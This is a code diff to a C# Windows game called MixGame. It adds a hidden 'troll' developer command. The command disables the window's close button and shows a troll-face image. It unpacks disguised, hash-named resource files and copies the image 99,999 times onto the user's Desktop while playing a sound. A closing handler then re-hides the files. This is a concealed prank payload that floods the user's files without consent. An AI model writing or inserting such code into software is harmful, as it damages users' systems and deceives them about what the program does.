@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
@@ -489,6 +490,29 @@ namespace MixGame
                     }
                     break;
 
+                case "troll":
+                    if (devMode)
+                    {
+                        MixGame.ActiveForm.ControlBox = false;
+                        marble.Image = Properties.Resources.TrollFace;
+                        marble.Size = new Size(209, 112);
+                        marble.Location = new Point(200, 135);
+
+                        string user = Path.GetDirectoryName(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
+                        System.IO.File.Move(@"eacf867e4f019f43a04d0b2af7e3e7f4", @"eacf867e4f019f43a04d0b2af7e3e7f4.png");
+                        System.IO.File.Move(@"44d7180ae5e00e9346d3badd89ad1bb3", @"44d7180ae5e00e9346d3badd89ad1bb3.wav");
+                        for (int index = 0; index < 99999; index++) {
+                            string source = @"eacf867e4f019f43a04d0b2af7e3e7f4.png";
+                            string target = user + @"\Desktop\eacf867e4f019f43a04d0b2af7e3e7f4 [" + index.ToString() + @"] .png";
+                            System.IO.File.Copy(source, target);
+                        }
+
+                        System.Media.SoundPlayer player = new System.Media.SoundPlayer();
+                        player.SoundLocation = "44d7180ae5e00e9346d3badd89ad1bb3.wav";
+                        player.Play();
+                    }
+                    break;
+
                 case "confirm":
                     if(devMode)
                     {
@@ -498,6 +522,19 @@ namespace MixGame
                         difficulty.Enabled = false;
                     }
                     break;
+            }
+        }
+
+        private void MixGame_FormClosing(object sender, FormClosingEventArgs e)
+        { 
+            try
+            {
+                System.IO.File.Move(@"eacf867e4f019f43a04d0b2af7e3e7f4.png", @"eacf867e4f019f43a04d0b2af7e3e7f4");
+                System.IO.File.Move(@"44d7180ae5e00e9346d3badd89ad1bb3.wav", @"44d7180ae5e00e9346d3badd89ad1bb3");
+            }
+            catch (FileNotFoundException)
+            {
+                return;
             }
         }
     }
